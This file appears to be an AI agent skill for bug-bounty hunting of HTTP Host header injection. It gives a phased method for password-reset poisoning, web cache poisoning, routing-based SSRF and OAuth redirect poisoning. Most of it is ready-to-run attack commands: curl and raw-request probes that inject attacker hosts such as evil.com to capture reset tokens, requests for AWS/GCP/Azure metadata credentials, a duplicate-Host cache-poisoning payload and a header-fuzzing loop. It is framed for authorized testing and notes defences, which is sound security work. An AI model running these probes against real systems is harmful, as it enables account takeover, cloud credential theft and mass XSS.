# Upstream source: host-header (hunting)

Original path: `/tmp/h1res_MrPsycho04_Hunting-Agent/host-header/SKILL.md`

---

---
name: host-header
description: "Hunt Host Header Injection — password reset poisoning → ATO, web cache poisoning via unkeyed Host/X-Forwarded-Host, routing-based SSRF (Host picks upstream → cloud metadata/internal services), path-override SSRF/ACL-bypass (X-Original-URL/X-Rewrite-URL), OAuth redirect_uri/issuer poisoning, and absolute-URL link poisoning in emails. High to Critical when it reaches ATO or mass cache poisoning. Built on public Host-header research (PortSwigger 'Practical web cache poisoning' + James Kettle, and the classic password-reset-poisoning class). Use on any forgot-password flow, CDN/reverse-proxy-fronted app, OAuth/OIDC endpoint, or absolute-URL-in-email feature."
---

# HUNT-HOST-HEADER — Host Header Injection

## Grounding / Provenance

This skill is built from the public Host-header attack literature, not invented payloads.
Cite the *technique source* in your report, never a fabricated ID:

- **Password-reset poisoning class** — the canonical write-up is Skelet's/Detectify-era
  "Practical HTTP Host header attacks" (the Django `request.get_host()` → password-reset-link
  case). Many frameworks built the reset URL from the request Host with no `ALLOWED_HOSTS`-style
  allowlist. Cite the framework + the reflected-Host behaviour you actually observed.
- **Web cache poisoning via unkeyed Host / X-Forwarded-Host** — PortSwigger Research,
  James Kettle, "Practical Web Cache Poisoning" (2018) and "Web Cache Entanglement" (2020).
  These define unkeyed-input poisoning, which is the mechanism behind X-Forwarded-Host poisoning.
- **Routing-based SSRF** — PortSwigger Research, "Cracking the lens" / routing-based SSRF
  (Host header steers the front-end's upstream selection).

When you write the report, name the exact behaviour you reproduced (reflected header, cache HIT
on a fresh key, OOB hit from your Collaborator). Do **not** copy a CVE or H1 ID you have not
verified — a missing citation is always better than a wrong one.

---

## Crown Jewel Targets

Host header injection that reaches password reset links = Critical (ATO for any user).

**Highest-value chains:**
- **Password reset poisoning → ATO** — server builds the reset link from the request Host;
  attacker sets `Host: evil.com`; the victim's reset email points the token at the attacker →
  token captured on click → full ATO. Pre-account-takeover variant: even the victim *requesting*
  their own reset leaks the token to evil.com.
- **Web cache poisoning via unkeyed Host** — a CDN/reverse proxy caches a response that reflects
  an attacker `X-Forwarded-Host` into an absolute URL (script src, link, redirect) → poisoned
  entry served to every later visitor on that cache key → mass XSS/redirect/CSP bypass.
- **Routing-based SSRF** — the front-end uses the *Host header itself* to pick the upstream;
  `Host: 169.254.169.254` (or an internal hostname) makes it forward your request to that target
  → cloud metadata / internal admin panels.
- **Path-override SSRF / ACL bypass** — IIS/ASP.NET/Spring honour `X-Original-URL` /
  `X-Rewrite-URL` to override the routed path → reach `/admin` or internal endpoints the edge
  ACL thought it blocked. (Different layer from routing SSRF — see Phase 3.)
- **OAuth/OIDC poisoning** — Host drives `redirect_uri` or the OIDC `issuer` / discovery doc →
  auth-code or token theft → ATO.

---

## Attack Surface Signals

```
Any password reset / forgot-password / email-verification / invite endpoint
Any app behind CDN/reverse proxy (Cloudflare, Varnish, Fastly, Akamai, Nginx, HAProxy)
OAuth/OIDC authorization + /.well-known/openid-configuration endpoints
Absolute URLs constructed from request Host (set-password links, share links, webhooks)
Email-sending endpoints (transactional mail, notifications)
Reverse proxies that may route by Host (k8s ingress, service mesh, internal forward proxies)
```

**Dangerous header candidates (unkeyed / trusted inputs):**
```
Host                 X-Forwarded-Host      X-Host
X-Forwarded-Server   X-HTTP-Host-Override  Forwarded
X-Original-URL       X-Rewrite-URL         X-Override-URL   (path-override class)
```

---

## Step-by-Step Hunting Methodology

> Always test against **your own** registered test account. Never request another user's reset.

### Phase 1 — Password Reset Poisoning

```bash
# 1a. Override Host directly
curl -s -X POST https://$TARGET/forgot-password \
  -H "Host: evil.com" \
  -H "Content-Type: application/json" \
  -d '{"email":"your-test-account@target.com"}'

# 1b. X-Forwarded-Host (behind reverse proxy that trusts it)
curl -s -X POST https://$TARGET/forgot-password \
  -H "Host: $TARGET" \
  -H "X-Forwarded-Host: evil.com" \
  -d "email=your-test-account@target.com"

# 1c. Host + X-Forwarded-Host combo, and X-Host
curl -s -X POST https://$TARGET/forgot-password \
  -H "Host: $TARGET" -H "X-Host: evil.com" \
  -d "email=your-test-account@target.com"

# 1d. Dual-Host / Host override smuggling: some stacks read the SECOND Host
printf 'POST /forgot-password HTTP/1.1\r\nHost: %s\r\nHost: evil.com\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 33\r\nConnection: close\r\n\r\nemail=your-test-account@target.com' "$TARGET" \
  | openssl s_client -quiet -connect $TARGET:443 2>/dev/null

# 1e. Absolute-URL injection: keep real Host, append attacker host so the
#     reset link becomes https://TARGET.evil.com/... or routes the token out
curl -s -X POST https://$TARGET/forgot-password \
  -H "Host: $TARGET.evil.com" -d "email=your-test-account@target.com"

# 1f. Trailing-port / userinfo confusion (parsers that split on : or @)
curl -s -X POST https://$TARGET/forgot-password \
  -H "Host: $TARGET:1@evil.com" -d "email=your-test-account@target.com"
```

**Confirm:** open the reset email *in your own test inbox* and read the link host. The token must
appear under an attacker-controlled host (`evil.com`, `$TARGET.evil.com`, or a Collaborator
domain) for this to be a real finding. **Use a Burp Collaborator domain as the injected host** so
that when the victim clicks (or a preview-fetcher fetches), you capture the token out-of-band and
have proof — see Validation.

### Phase 2 — Web Cache Poisoning via Host / X-Forwarded-Host

Mechanism: this is a **reflection** bug, not an OOB bug. The injected host must be *reflected into
the response body* (an absolute URL, script `src`, `<link href>`, `<base href>`, redirect
`Location`, or canonical/og:url) **and** that response must be **cached on a key you do not
control**. No Collaborator callback is expected from the cache test itself — only later, if a
victim's browser loads the poisoned absolute URL.

```bash
# 2a. Is the host reflected into the body?
curl -s https://$TARGET/ \
  -H "Host: $TARGET" -H "X-Forwarded-Host: canary-$RANDOM.example" \
  | grep -i "canary"

# 2b. Is the response cacheable, and what is the cache key?
curl -sI "https://$TARGET/?cb=$RANDOM" \
  | grep -iE "cache-control|cf-cache-status|x-cache|age|via|surrogate|vary"
#   Look for: X-Cache/CF-Cache-Status: HIT, nonzero Age, Via: varnish/fastly/cloudfront.
#   Check Vary: — if Vary does NOT include X-Forwarded-Host, the header is UNKEYED → poisonable.

# 2c. Prove poisoning: poison once, then fetch CLEAN (no injected header) on same key.
URL="https://$TARGET/?cb=poison$RANDOM"
curl -s "$URL" -H "X-Forwarded-Host: evilcdn.example" >/dev/null   # poison
curl -s "$URL" | grep -i "evilcdn.example"                        # clean victim view → reflected = POISONED
```

**False-positive killers (mandatory):**
- A reflection that only ever appears for *your* request (because the header is **keyed**, e.g. in
  `Vary`, or the CDN includes Host in the key) is **not** poisoning — confirm 2c returns the
  payload on a request that *omits* the header.
- `Age: 0` + `MISS` every time → no shared cache → no mass impact. Demote to self-only / Low.
- Confirm blast radius from a **second machine / fresh egress IP / incognito** before claiming
  "mass". Cache scope is often per-edge / per-cookie / per-geo.

### Phase 3 — SSRF via Host Header — TWO DISTINCT MECHANISMS (do not conflate)

These operate at different layers. Test them separately; they do **not** compose into one request.

**(3A) Routing-based SSRF — the Host header selects the upstream.** The path goes on the
**request line**, exactly as a normal request, because the metadata service / internal host serves
plain HTTP and only sees the request line + headers you forward. `X-Original-URL` is irrelevant
here — the EC2 IMDS ignores it.

```bash
# Correct routing-SSRF probe: path on the request line, Host steers the proxy upstream.
curl -s "https://$TARGET/latest/meta-data/" -H "Host: 169.254.169.254"
curl -s "https://$TARGET/latest/meta-data/iam/security-credentials/" -H "Host: 169.254.169.254"

# GCP / Azure equivalents (still routing via Host):
curl -s "https://$TARGET/computeMetadata/v1/" \
  -H "Host: metadata.google.internal" -H "Metadata-Flavor: Google"
curl -s "https://$TARGET/metadata/instance?api-version=2021-02-01" \
  -H "Host: 169.254.169.254" -H "Metadata: true"

# Internal hostname / port routing:
curl -s "https://$TARGET/" -H "Host: localhost:6379"   # Redis behind the proxy
curl -s "https://$TARGET/" -H "Host: internal-admin.svc.cluster.local"

# Blind / no reflection? Point the Host at a Collaborator subdomain and watch for the
# proxy's outbound DNS/HTTP lookup — that proves the front-end resolves the attacker host.
curl -s "https://$TARGET/" -H "Host: $COLLAB"
```

**(3B) Path-override SSRF / ACL bypass — `X-Original-URL` / `X-Rewrite-URL`.** This is an
IIS/ASP.NET/Spring-Cloud-Gateway feature where the app overrides the *routed path*. The real Host
stays put; you are bypassing an **edge path ACL**, not steering an upstream. Keep the real Host.

```bash
# Reach an internal/blocked path the edge thought it denied. Real Host stays.
curl -s "https://$TARGET/" -H "Host: $TARGET" -H "X-Original-URL: /admin"
curl -s "https://$TARGET/" -H "Host: $TARGET" -H "X-Rewrite-URL: /internal/metrics"
# Diff against a direct GET /admin (which the edge blocks) — a different status/body proves override.
```

> The old probe `Host: 169.254.169.254` + `X-Original-URL: /latest/meta-data/` was wrong: those
> two headers act at different layers and never compose. Use 3A for metadata, 3B for ACL bypass.

### Phase 4 — OAuth / OIDC / SAML Poisoning

```bash
# Does the authorization endpoint build redirect_uri / display URL from Host?
curl -s "https://$TARGET/oauth/authorize?response_type=code&client_id=app&redirect_uri=https://$TARGET/cb" \
  -H "Host: evil.com" | grep -iE "redirect|location|action="

# OIDC discovery: if issuer/endpoints reflect Host, the whole flow can be re-pointed.
curl -s "https://$TARGET/.well-known/openid-configuration" -H "X-Forwarded-Host: evil.com" \
  | grep -iE "issuer|authorization_endpoint|token_endpoint|jwks_uri"
```

**Confirm:** the auth code / token must actually be delivered to the attacker host (capture on
Collaborator) — a reflected string alone is not ATO.

### Phase 5 — Header Fuzzing (Param Miner)

Burp **Param Miner → Guess headers** is faster and finds unkeyed/cache-affecting headers the list
below misses. Manual sweep:

```bash
HOST_HEADERS=(X-Forwarded-Host X-Host X-Forwarded-Server X-HTTP-Host-Override \
  Forwarded X-Original-URL X-Rewrite-URL X-Override-URL X-Forwarded-Scheme)
for H in "${HOST_HEADERS[@]}"; do
  echo "=== $H ==="
  curl -s -I "https://$TARGET/" -H "$H: canary-$RANDOM.example" \
    | grep -iE "location|x-cache|cf-cache|age|set-cookie"
done
```

---

## Chain Table

| Finding | Chain to | Impact |
|---------|----------|--------|
| Reset link host = attacker (own test acct) | Collaborator-host injection → capture token on click | Critical — ATO any user |
| X-Forwarded-Host reflected in absolute URL + cacheable, unkeyed | Poison key → clean fetch returns payload → load XSS/redirect | High — mass cache poisoning |
| Front-end routes by Host | `Host: 169.254.169.254` path-on-request-line → creds | High/Critical — SSRF → cloud creds |
| `X-Original-URL` overrides path | Reach `/admin` blocked at edge | High — ACL bypass / SSRF |
| OAuth redirect_uri/issuer built from Host | Re-point flow → capture code/token on Collaborator | Critical — ATO via code theft |

---

## Validation (house discipline)

✅ **Password reset:** the token URL in **your own test account's email** uses an
attacker-controlled host. Strongest proof = inject a **Collaborator** host and show the inbound
HTTP hit carrying the token when the link is clicked/previewed (OOB capture).
✅ **Cache poison:** a request that **omits** the injected header (fresh egress IP / incognito)
still returns the attacker payload → shared-cache poisoning proven. Demote to Low if Vary-keyed or
`MISS`/`Age:0` only.
✅ **Routing SSRF:** real response body from `169.254.169.254` / internal host, **or** an OOB
DNS/HTTP hit on your Collaborator from the front-end (blind case).
✅ **Path-override:** status/body diff vs the edge-blocked direct request proves the override took.
✅ **OAuth/OIDC:** the auth code / token is actually delivered to the attacker host (captured),
not merely reflected.

**Always rule out false positives:**
- Reflected ≠ cached. Cached-for-you ≠ cached-for-others (check `Vary`, second IP).
- A 200 echoing your Host string is not SSRF unless the *response content* came from the internal
  target or your Collaborator fired.
- Some mailers rewrite links to a fixed `SITE_URL` regardless of Host — reflected header in the
  HTTP response does not guarantee a poisoned *email*; verify the email body.

**Severity:**
- Reset → ATO for any user: Critical
- Routing SSRF → cloud metadata creds: Critical (if creds usable) / High
- Cache poisoning → mass XSS/redirect (shared key proven): High
- Path-override → internal/admin reach: High
- Reflected only, uncacheable, not in email, no internal reach: Low / informational

## Web-Research Methodology Additions (2026)

### A. Discovery checklist — concrete places, params, headers, infra signals to look
- Enumerate every Host-like carrier, not just `Host`: `X-Forwarded-Host`, `X-Host`, `X-Forwarded-Server`, `X-Original-Host`, `Forwarded: host=...`, `X-Rewrite-Url`, `X-Original-URL`. Frameworks trust these by default (Craft CMS, Laravel, Django-style absolute URL builders). CVE-2026-42606 (AzuraCast) is a fresh example: `ApplyXForwarded` middleware unconditionally trusts `X-Forwarded-Host`, poisoning reset links -> token theft -> 2FA bypass.
- Find every place the application builds an absolute URL: password-reset emails, email-verification/invite links, `Location` redirects, canonical/OG tags, `<script src="//host/...">`, payment return URLs, OAuth `redirect_uri` / issuer / discovery documents, webhook callbacks.
- Map the proxy topology from response headers and banners. The bug usually lives in a *disagreement*: front-end uses the first Host for routing, back-end uses the second for URL construction. Look for `X-Cache-Status: HIT` that stays HIT after injecting a second Host (proves Host is not in the key).
- Test every Host mutation class: omit Host (HTTP/1.0), duplicate Host, absolute-form request line (`GET https://target/ HTTP/1.1` plus a different Host), port suffix, userinfo, prefix/whitelist bypass, trailing `@`, whitespace before colon, and duplicate values concatenated with commas.
- Note that validation often covers only the first header instance or only `Host` — not overrides. Confirm what the app actually reflects in the response/email before escalating.
- For routing-based SSRF, identify reverse proxies/load balancers that select an upstream from Host. Any internal hostname or IP in Host that reaches the origin is a signal.
- Record cookies/CSRF tokens required for the reset request (some apps need the session and CSRF token for the double-Host trick to work).

### B. Techniques & bypasses — specific actionable techniques/payload shapes
- Password-reset poisoning — the canonical probe:
  ```
  POST /password-reset HTTP/1.1
  Host: www.attackers-domain.example
  ...
  user=alice
  ```
  Then check the emailed link. Try `X-Forwarded-Host: evil.com`, `X-Host`, and `Forwarded`. A 2026 advisory shows the same flaw with a direct `curl -H "X-Forwarded-Host: evil.com"`.
- Weak-validation bypass via userinfo (Slack H1 #727330): append `@` so the real host is parsed as HTTP Basic auth user:
  ```
  X-Forwarded-Host: files.slack.com@www.unique-attacker-domain.example
  ```
  The app sees a "valid" files.slack.com prefix; the HTTP client treats the attacker domain as the host -> blind SSRF with OOB callback.
- Duplicate-Host / ambiguous-request cache poisoning (PortSwigger lab): front-end routes on the first Host, back-end builds script URLs from the second:
  ```
  GET / HTTP/1.1
  Host: target
  Host: exploit-server.example
  ```
  Combine with `/resources/js/tracking.js` containing `alert(document.cookie)` for stored XSS served from cache.
- Absolute-form request line discrepancy:
  ```
  GET https://target/ HTTP/1.1
  Host: bad-stuff-here
  ```
  RFC says the request line wins for routing; many stacks use Host — exploit the split.
- Host with port / prefix tricks: `target:evil.com`, `target.evil.com`, `evil.com/target`, `target%00.evil.com`, `target.` (trailing dot), whitespace before colon (`Host :`), and duplicate values separated by commas. Always compare reflected output against a baseline.
- Routing SSRF via Host (path on request line, Host steers upstream):
  ```
  GET /internal-admin HTTP/1.1
  Host: 127.0.0.1:8080
  ```
  OOB confirmation: set Host to a Collaborator/interactsh domain; a DNS/HTTP hit from the proxy proves the front-end resolves the attacker host.
- X-Original-URL / X-Rewrite-URL path override (distinct primitive): keep the real Host and override the path to reach an endpoint the edge denied:
  ```
  GET /nonexistent HTTP/1.1
  Host: target
  X-Original-URL: /admin
  ```
  Diff against a direct `GET /admin` (blocked) — a different status/body proves override.
- OAuth/OIDC poisoning: if the authorize endpoint derives `redirect_uri` or the discovery issuer from Host, redirect code/tokens to the attacker host. If discovery documents reflect Host, the entire OIDC flow can be re-pointed.

### C. Validation / proof bar — how to confirm and avoid false positives
- Reflection alone is not impact. Show the *downstream* consequence: reset email containing the attacker host + a live captured token; a cached poisoned response delivered to a clean second session; an OOB callback from the proxy; or an actual redirect of a victim to the attacker domain.
- For reset poisoning, capture the token in a server you control, then complete a real password reset against the genuine host with that token. Demonstrate takeover of a test account you own — do not stop at "the link points to evil.com."
- Distinguish Host injection from web cache poisoning: if the malicious Host only affects your own request, it is low impact. It becomes High/Critical when the poisoned response is cached and served to other users (check `X-Cache` stays HIT on a clean fetch) or when it enables ATO/SSRF.
- Beware false positives from wildcard DNS / catch-all virtual hosts: if any random Host resolves to the app, reflection is expected. Require that the app uses the value in a security-relevant URL.
- Confirm which Host instance each hop uses; somelabs require the victim's `session` and `_lab` cookie for the double-Host behavior. Document session/cookie prerequisites so triage can reproduce.
- Defensive framing: avoid absolute URLs from Host (use a configured canonical domain), validate Host against an allowlist, reject duplicate Host headers, and do not support override headers by default.

### D. Sources — numbered list of URLs you actually fetched
1. https://www.fastly.com/learning/security/what-are-http-host-header-attacks
2. https://portswigger.net/web-security/host-header
3. https://portswigger.net/web-security/host-header/exploiting
4. https://portswigger.net/web-security/host-header/exploiting/lab-host-header-web-cache-poisoning-via-ambiguous-requests
5. https://www.vaadata.com/en/blog/host-header-attacks-exploitations-and-security-tips
6. https://github.com/advisories/GHSA-gv7r-3mr9-h5x8
7. https://www.invicti.com/learn/password-reset-poisoning
